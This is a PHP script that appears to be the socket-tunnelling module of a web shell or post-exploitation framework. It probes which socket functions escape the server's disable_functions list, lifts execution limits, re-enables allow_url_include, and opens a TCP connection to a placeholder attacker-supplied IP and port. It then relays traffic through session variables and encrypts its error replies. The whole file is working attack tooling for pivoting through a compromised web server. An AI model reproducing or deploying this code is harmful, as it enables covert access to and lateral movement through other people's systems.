
function canCall($f)
{
    $disab_func = @ini_get('disable_functions') ? @ini_get('disable_functions') : array();
    if (!empty($disab_func)) {
        $disab_func = preg_replace('/[, ]+/', ',', $disab_func);
        $disab_func = array_map('trim', explode(',', $disab_func));
    }
    return function_exists($f) && is_callable($f) && !in_array($f, $disab_func);
}

function getSocket($ip, $port)
{
    if (canCall("stream_socket_client")) {
        $s = stream_socket_client("tcp://{$ip}:{$port}");
        $type = 'stream';
    } elseif (canCall("fsockopen")) {
        $s = fsockopen($ip, $port);
        $type = 'stream';
    } elseif (canCall("socket_create")) {
        $s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res)
            die();
        $type = 'socket';
    } else {
        $s = null;
        $type = false;
    }
    return array("s" => $s, "type" => $type);
}

function errOut($data, $key)
{
    $data = array(
        "status" => false,
        "data" => $data
    );
    echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $key);
    die();
}

//error_reporting(0);
ini_set('max_execution_time', 0);
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
set_time_limit(0);
ignore_user_abort(1);
$key = $_SESSION['key'];
session_write_close();

$ip = base64_decode('__IP__');
$port = intval('__PORT__');
$sockID = base64_decode('__SOCKID__');

if (function_exists('dl'))
    dl("php_sockets.dll");

$s = getSocket($ip, $port);
$sock = $s["s"];
$type = $s["type"];
if ($type === false)
    errOut("Failed to connect", $key);

@session_start();
$_SESSION["status_$sockID"] = true;
$_SESSION["write_$sockID"] = "";
$_SESSION["read_$sockID"] = "";
session_write_close();

$socketRead = ($type == 'stream') ? "fread" : "socket_read";
$socketWrite = ($type == 'stream') ? "fwrite" : "socket_write";
$socketClose = ($type == 'stream') ? "fclose" : "socket_close";
$socketSelect = ($type == 'stream') ? "stream_select" : "socket_select";
($type == 'stream') ? stream_set_blocking($sock, false) : socket_set_nonblock($sock);

$running = true;
while ($running) {
    @session_start();
    $writeBuff = $_SESSION["write_$sockID"];
    $_SESSION["write_$sockID"] = "";
    session_write_close();
    if ($writeBuff != "") {
        $i = $socketWrite($sock, $writeBuff, strlen($writeBuff));
        if ($i === false) {
            @session_start();
            $_SESSION["status_$sockID"] = false;
            session_write_close();
            errOut("Failed to write", $key);
        }
    }
    $readBuff = "";
    while ($o = $socketRead($sock, 512)) {
        if ($o === false) {
            @session_start();
            $_SESSION["status_$sockID"] = false;
            session_write_close();
            errOut("Failed to read", $key);
        }
        $readBuff .= $o;
    }

    if ($readBuff != "") {
        @session_start();
        $_SESSION["read_$sockID"] .= $readBuff;
        session_write_close();
    } else usleep(50000);
    @session_start();
    $running = $_SESSION["status_$sockID"];
    session_write_close();
}

$socketClose($sock);
@session_start();
unset($_SESSION["status_$sockID"]);
unset($_SESSION["read_$sockID"]);
unset($_SESSION["write_$sockID"]);
session_write_close();
